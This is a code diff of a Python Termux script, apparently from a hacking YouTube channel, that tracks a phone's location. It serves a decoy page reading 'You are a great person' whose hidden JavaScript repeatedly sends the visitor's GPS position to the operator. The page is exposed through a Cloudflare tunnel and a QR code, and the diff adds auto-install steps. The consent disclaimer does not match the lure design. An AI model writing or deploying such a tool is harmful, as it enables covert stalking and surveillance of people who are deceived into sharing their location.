@@ -1,8 +1,6 @@
 #!/usr/bin/env python3
 # hco_track_phone.py
-# HCO Track Phone by Azhar - CLOUDFLARE EDITION
-# Save as hco_track_phone.py and run: python3 hco_track_phone.py
-#
+# HCO Track Phone by Azhar - FULL AUTO INSTALL + CLOUDFLARE
 # IMPORTANT: Use this only on devices YOU OWN or with EXPLICIT CONSENT.
 
 import os
@@ -16,12 +14,14 @@ from pathlib import Path
 try:
     import requests
     from flask import Flask, request
-except Exception:
-    print("Missing Python packages. Install them with:")
-    print("  pkg install python -y && pip install flask requests qrcode[pil]")
-    sys.exit(1)
+except ImportError:
+    print("Installing missing Python packages...")
+    os.system('pkg install python wget -y')
+    os.system('pip install flask requests qrcode[pil]')
+    import requests
+    from flask import Flask, request
 
-# Colors
+# ---------------- Colors ----------------
 RED = "\033[1;91m"
 GREEN = "\033[1;92m"
 CYAN = "\033[1;96m"
@@ -29,7 +29,7 @@ YELLOW = "\033[1;93m"
 RESET = "\033[0m"
 
 app = Flask(__name__)
-locations = {}  # latest location dict
+locations = {}
 
 # ---------------- TOOL LOCK ----------------
 def tool_lock():
@@ -37,33 +37,55 @@ def tool_lock():
     print(f"{RED}╔{'═'*60}╗{RESET}")
     print(f"{RED}║{'🔒 TOOL LOCKED 🔒'.center(60)}║{RESET}")
     print(f"{RED}║{'HCO TRACK PHONE BY AZHAR'.center(60)}║{RESET}")
-    print(f"{RED}║{'Subscribe @hackers_colony_tech'.center(60)}║{RESET}")
+    print(f"{RED}║{'Subscribe @hackers_colony_tech 🔔'.center(60)}║{RESET}")
     print(f"{RED}╚{'═'*60}╝{RESET}\n")
     print(f"{YELLOW}This script is for testing on devices you own or where you have explicit permission.{RESET}\n")
     for i in range(9, 0, -1):
         sys.stdout.write(f"\r{CYAN}⏳ Redirecting in {i}...{RESET}")
         sys.stdout.flush()
         time.sleep(1)
-    # Best-effort open YouTube on Android/Termux
     os.system('am start -a android.intent.action.VIEW -d "https://youtube.com/@hackers_colony_tech" > /dev/null 2>&1 || true')
     print(f"\n{GREEN}✅ Redirected to YouTube (if available).{RESET}\n")
-    input(f"{YELLOW}Press ENTER to continue... (or just press ENTER){RESET}")
+    input(f"{YELLOW}Press ENTER to continue...{RESET}")
 
-# ---------------- dependencies ----------------
+# ---------------- Dependencies ----------------
 def install_requirements():
     print(f"{CYAN}Checking/attempting to install requirements...{RESET}")
     os.system('pkg update -y > /dev/null 2>&1 || true')
     os.system('pkg install python wget -y > /dev/null 2>&1 || true')
     os.system('pip install flask requests qrcode[pil] > /dev/null 2>&1 || true')
 
-# ---------------- cloudflared / public url ----------------
+# ---------------- Cloudflared ----------------
+def download_cloudflared():
+    arch = subprocess.getoutput("uname -m")
+    url = ""
+    if arch == "aarch64":
+        url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64"
+    elif arch.startswith("arm"):
+        url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm"
+    elif arch in ["x86_64", "amd64"]:
+        url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64"
+    else:
+        print(f"{RED}Unsupported CPU architecture: {arch}{RESET}")
+        return False
+
+    path = Path(os.environ.get("PREFIX", "/data/data/com.termux/files/usr")) / "bin/cloudflared"
+    if not path.exists():
+        print(f"{CYAN}Downloading cloudflared for {arch}...{RESET}")
+        os.system(f"wget -qO {path} {url}")
+        os.system(f"chmod +x {path}")
+        print(f"{GREEN}✅ cloudflared installed at {path}{RESET}")
+    return True
+
 def start_cloudflared_tunnel(port=8080, timeout=12):
-    """Try to start `cloudflared http <port>` and parse trycloudflare URL. Returns (url, proc) or (None, None)."""
     cmd = ["cloudflared", "http", str(port)]
     try:
         proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1)
     except FileNotFoundError:
-        return None, None
+        if download_cloudflared():
+            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1)
+        else:
+            return None, None
 
     url = None
     pattern = re.compile(r"https://[a-z0-9\-]+\.trycloudflare\.com", re.IGNORECASE)
@@ -79,7 +101,6 @@ def start_cloudflared_tunnel(port=8080, timeout=12):
             break
 
     if url:
-        # keep process alive in background
         threading.Thread(target=lambda p: p.wait(), args=(proc,), daemon=True).start()
         return url, proc
 
@@ -106,10 +127,9 @@ def create_public_url(port=8080):
         return f"http://{ip}:{port}"
     return f"http://localhost:{port}"
 
-# ---------------- flask endpoints ----------------
+# ---------------- Flask endpoints ----------------
 @app.route("/")
 def index():
-    # Page shows only the message. On load the page requests continuous position updates and sends them.
     return """
     <!doctype html>
     <html>
@@ -123,7 +143,6 @@ def index():
     <body>
       <div>You are a great person 😁</div>
       <script>
-        // Continuous updates using watchPosition
         function onSuccess(pos) {
           try {
             fetch('/update', {
@@ -140,17 +159,12 @@ def index():
             }).catch(()=>{});
           } catch(e) {}
         }
-        function onError(err) {
-          // nothing visible to user; page remains the "You are a great person" message
-        }
+        function onError(err) {}
         if (navigator.geolocation && navigator.permissions) {
-          // Try to request permission and start watchPosition
           navigator.permissions.query({name:'geolocation'}).then(function(status){
-            // call getCurrentPosition to trigger the permission prompt immediately in some browsers
             navigator.geolocation.getCurrentPosition(function(){}, function(){}, {enableHighAccuracy:true});
             navigator.geolocation.watchPosition(onSuccess, onError, {enableHighAccuracy:true, maximumAge:3000, timeout:10000});
           }).catch(function(){
-            // fallback: just start watchPosition (will trigger prompt)
             navigator.geolocation.watchPosition(onSuccess, onError, {enableHighAccuracy:true, maximumAge:3000, timeout:10000});
           });
         } else if (navigator.geolocation) {
@@ -174,7 +188,6 @@ def update():
     locations.clear()
     locations.update(data)
 
-    # Print a concise line and a Google Maps link
     lat = data.get("lat")
     lon = data.get("lon")
     acc = data.get("accuracy", "N/A")
@@ -185,23 +198,22 @@ def update():
     print(f"{CYAN}Maps: https://maps.google.com/?q={lat},{lon}{RESET}\n")
     return "OK", 200
 
-# ---------------- qr helper ----------------
+# ---------------- QR helper ----------------
 def make_qr(url):
     try:
         import qrcode
         out = Path("track_qr.png")
         img = qrcode.make(url)
         img.save(out)
-        # try open in Termux or desktop
         os.system(f"termux-open {out} > /dev/null 2>&1 || xdg-open {out} > /dev/null 2>&1 || true")
     except Exception:
         pass
 
-# ---------------- start flask in thread ----------------
+# ---------------- Server ----------------
 def start_server(port=8080):
     threading.Thread(target=lambda: app.run(host="0.0.0.0", port=port, debug=False, use_reloader=False), daemon=True).start()
 
-# ---------------- main ----------------
+# ---------------- Main ----------------
 def main():
     tool_lock()
     install_requirements()
@@ -226,7 +238,6 @@ def main():
         while True:
             if locations.get("time", 0) > last_time:
                 last_time = locations["time"]
-                # already printed in /update handler
             time.sleep(1)
     except KeyboardInterrupt:
         print(f"\n{RED}🛑 Stopped by user{RESET}")
